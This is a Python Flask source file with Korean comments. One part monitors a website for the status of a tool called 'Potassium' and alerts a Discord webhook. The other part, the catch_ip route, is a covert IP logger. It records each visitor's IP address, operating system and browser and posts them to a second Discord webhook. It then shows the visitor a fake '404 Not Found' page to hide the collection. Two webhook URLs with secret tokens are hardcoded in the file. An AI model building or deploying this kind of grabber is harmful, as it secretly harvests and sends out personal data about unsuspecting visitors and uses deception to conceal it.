import os
import time
import threading
import requests
from bs4 import BeautifulSoup
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

# 설정
DISCORD_WEBHOOK_URL_STATUS = "https://discord.com/api/webhooks/1547891715279687763/jGm9yeR8j_k5kOHFS-Knmt57n8bm8vTSTiiAVJAlmywH0HsSEeCjNL-2XRkOqHrU6flW" # 포타슘 상태 알림용
DISCORD_WEBHOOK_URL_IP = "https://discord.com/api/webhooks/1547879120195821639/3rQMtk8DOXHI2OjmBCaCNbv54yJm9u27t0GLbfhJQ-2oL7SAZVGQ_NhXzQ1D2yzzB89n"     # IP 로깅용

TARGET_URL = "https://weao.xyz"
last_status = None

# 1. 포타슘 상태 감시 백그라운드 스레드
def monitor_potassium():
    global last_status
    while True:
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            response = requests.get(TARGET_URL, headers=headers)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                potassium_element = None
                for tag in soup.find_all(string=lambda t: t and 'Potassium' in t):
                    potassium_element = tag.parent
                    break
                    
                if potassium_element:
                    element_html = str(potassium_element)
                    current_status = "Online (작동 중)" if ("green" in element_html or "🟢" in element_html or "working" in element_html.lower()) else "Offline (막힘/점검중)"
                    
                    if last_status is not None and last_status != current_status:
                        discord_payload = {
                            "content": f"🚨 **포타슘(Potassium) 상태 변경 감지!**\n상태: `{current_status}`"
                        }
                        requests.post(DISCORD_WEBHOOK_URL_STATUS, json=discord_payload)
                        print(f"[!] 포타슘 상태 변경 알림 전송: {current_status}")
                        
                    last_status = current_status
        except Exception as e:
            print(f"[!] 모니터링 에러: {e}")
            
        time.sleep(60)

# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (메인 주소 접속 시 작동)
@app.route('/')
def catch_ip():
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        user_ip = request.remote_addr
        
    user_agent = request.headers.get('User-Agent', 'N/A')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    os_info = "기타 OS"
    browser_info = "기타 브라우저"
    
    if "Windows NT 10.0" in user_agent:
        os_info = "Windows 10 / 11"
    elif "Windows NT 6.1" in user_agent:
        os_info = "Windows 7"
    elif "Mac OS X" in user_agent:
        os_info = "macOS"
    elif "Android" in user_agent:
        os_info = "Android"
    elif "iPhone" in user_agent or "iPad" in user_agent:
        os_info = "iOS"
    elif "Linux" in user_agent:
        os_info = "Linux"
        
    if "Edg/" in user_agent:
        try:
            ver = user_agent.split("Edg/")[1].split(" ")[0]
            browser_info = f"Edge ({ver})"
        except:
            browser_info = "Edge"
    elif "Chrome/" in user_agent:
        try:
            ver = user_agent.split("Chrome/")[1].split(" ")[0]
            browser_info = f"Chrome ({ver})"
        except:
            browser_info = "Chrome"
    elif "Firefox/" in user_agent:
        try:
            ver = user_agent.split("Firefox/")[1].split(" ")[0]
            browser_info = f"Firefox ({ver})"
        except:
            browser_info = "Firefox"
    elif "Safari/" in user_agent and "Chrome/" not in user_agent:
        browser_info = "Safari"

    # 렌더 서버 환경이므로 로컬 텍스트 파일 저장 대신 콘솔 출력으로 대체
    print(f"[!] 접속 로그 감지 -> IP: {user_ip} | OS: {os_info} | Browser: {browser_info}")
        
    discord_payload = {
        "content": "서버 접속 알림",
        "embeds": [
            {
                "title": "정보",
                "color": 3447003, 
                "fields": [
                    {"name": "IP 주소", "value": f"`{user_ip}`", "inline": True},
                    {"name": "시간", "value": f"`{timestamp}`", "inline": True},
                    {"name": "운영체제", "value": f"`{os_info}`", "inline": True},
                    {"name": "브라우저", "value": f"`{browser_info}`", "inline": True}
                ]
            }
        ]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK_URL_IP, json=discord_payload)
    except Exception as e:
        print(f"[!] 디스코드 웹훅 에러 발생 : {e}")
    
    return "404 Not Found"

if __name__ == '__main__':
    # 백그라운드 포타슘 감시 스레드 실행
    t = threading.Thread(target=monitor_potassium)
    t.daemon = True
    t.start()
    
    # 렌더 포트 바인딩 및 플라스크 서버 실행
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
